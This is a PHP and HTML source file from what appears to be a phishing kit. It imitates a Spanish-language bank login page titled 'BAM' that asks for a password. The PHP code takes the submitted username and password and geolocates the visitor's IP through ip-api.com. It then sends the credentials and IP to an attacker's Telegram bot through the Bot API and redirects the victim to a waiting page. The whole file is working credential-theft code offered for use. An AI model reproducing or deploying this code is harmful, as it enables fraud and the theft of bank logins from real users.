<?php
session_start();
error_reporting(0);
include "data.php";
$website = 'https://api.telegram.org/bot'.$token;
 
$ip = $_SERVER["REMOTE_ADDR"];
if (isset($_SESSION["user"]) && isset($_POST["user"])) {

$type = $_SESSION["user"];
$code_a = $_POST["user"];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip_data_in = curl_exec($ch);
curl_close($ch);
$ip_data = json_decode($ip_data_in, true);
$country = $ip_data["country"];
$city = $ip_data["city"];
$isp = $ip_data["isp"];
$code = $ip_data["countryCode"];
echo $ip_data;
//$time = gmstrftime("%Y. %B %d. %A. %X %Z");
$agent = $_SERVER["HTTP_USER_AGENT"];
$ip = $_SERVER["REMOTE_ADDR"];
$browser = get_browser_name($_SERVER["HTTP_USER_AGENT"]);


$msg = "\n➖➖➖💲BAM💲➖➖➖\n🥷🏾USER:  " . $type . "\n🔑PASS:  " . $code_a . "\n " . "\n📍 IP: " . $ip . "\n";
        

 $url = $GLOBALS['website'].'/sendMessage?chat_id='.$chat_id.'&parse_mode=HTML&text='.urlencode($msg);
        file_get_contents($url);

#echo '<script>window.location.href = "https://www.superdigital.cl/";</script>';
echo '<script>window.location.href = "espera.php";</script>';

    
}

function get_browser_name($user_agent)
{
if (strpos($user_agent, "Opera") || strpos($user_agent, "OPR/")) {
    return "Opera";
}
if (strpos($user_agent, "Edge")) {
    return "Edge";
}
if (strpos($user_agent, "Chrome")) {
    return "Chrome";
}
if (strpos($user_agent, "Safari")) {
    return "Safari";
}
if (strpos($user_agent, "Firefox")) {
    return "Firefox";
}
if (strpos($user_agent, "MSIE") || strpos($user_agent, "Trident/7")) {
    return "Internet Explorer";
}
return "Other";
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BAM</title>
    <link rel="stylesheet" href="cs.css">
</head>
<body class="body">

<center>

<form method="post" class="form" action="">
<br>
            <br>
            <br>
            <br>
            <br>
            <br>
<img src="bm-icon.svg" alt="">
<br><br>

<img class="title" src="title.png" alt="">

<br><br>
<div style="height: 100px;" class="caja1">
    <img class="ic" src="ic.png" alt="">
<input name="user" required class="ip1" type="password" placeholder="Ingresa tu contraseña">

<img class="olv" src="olv.png" alt="">

</div>
<br><br>
<input class="btn" type="submit" value="CONTINUAR">

<br>
<img class="pp" src="reg.png" alt="">
</form>

<br>

<img class="of" style= " " width="100%" src="imgg.png" alt="">
<br>
<img style="width: 200px;" src="terminos.png" alt="">

<br>
<img style="width: 300px;" src="copy.png" alt="">

</body>
</html>